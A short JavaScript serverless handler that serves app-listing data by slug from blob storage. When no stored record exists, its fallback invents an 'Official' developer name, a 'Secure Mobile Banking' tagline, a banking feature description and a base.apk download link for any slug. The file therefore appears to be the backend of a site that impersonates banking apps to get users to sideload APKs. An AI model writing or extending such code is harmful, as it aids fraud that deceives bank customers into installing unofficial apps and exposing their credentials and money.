import { head } from '@vercel/blob';

const blobToken = process.env.BLOB_READ_WRITE_TOKEN || process.env.VERCEL_BLOB_READ_WRITE_TOKEN;

export default async function handler(request, response) {
	const slug = new URL(request.url, `https://${request.headers.host}`).searchParams.get('slug');
	if (!slug || !/^[a-z0-9-]+$/.test(slug)) return response.status(400).json({ error: 'Invalid app slug' });
	try {
		const options = { access: 'private' };
		if (blobToken) options.token = blobToken;
		const record = await head(`apps/${slug}.json`, options);
		const data = await fetch(record.url).then((result) => result.json());
		return response.status(200).json(data);
	} catch {
		// Fallback clean dynamic data if json file doesn't exist yet
		const logoUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${slug}/logo`)}`;
		const apkUrl = `https://${request.headers.host}/api/blob?key=${encodeURIComponent(`apps/${slug}/base.apk`)}`;
		const name = slug.split('-')[0];
		const formattedName = name ? (name.charAt(0).toUpperCase() + name.slice(1)) : 'App';
		return response.status(200).json({
			name: formattedName,
			developer: `${formattedName} Official`,
			tagline: 'Secure Mobile Banking & Financial Services',
			description: `${formattedName} official mobile app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security.`,
			version: '2.4.1',
			logoUrl,
			apkUrl,
			slug
		});
	}
}